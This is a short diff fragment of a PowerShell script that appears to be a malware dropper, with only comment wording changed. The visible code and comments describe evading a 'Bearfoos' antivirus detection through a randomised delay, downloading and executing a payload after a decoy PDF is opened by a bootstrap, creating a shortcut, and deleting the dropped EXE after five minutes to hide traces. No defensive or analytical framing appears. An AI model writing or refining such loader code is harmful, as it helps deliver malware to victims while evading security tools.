@@ -49,8 +49,8 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-# === BEARFOOS EVASION: Delay before EXE ===
-# Since bootstrap already opened PDF and set flag, we just wait before downloading payload
+# === BEARFOOS EVASION: Long delay before EXE ===
+# PDF already opened by bootstrap; we simply wait and then deliver payload
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
 # === DOWNLOAD AND EXECUTE PAYLOAD ===
@@ -95,8 +95,7 @@ if (Test-Path $exePath) {
     }
 }
 
-# === CLEANUP ===
-# Remove EXE after 5 minutes; PDF is not touched by this script (handled by bootstrap)
+# Cleanup EXE after 5 minutes (PDF is untouched by this script)
 Start-Job -ScriptBlock {
     param($exe)
     Start-Sleep -Seconds 300
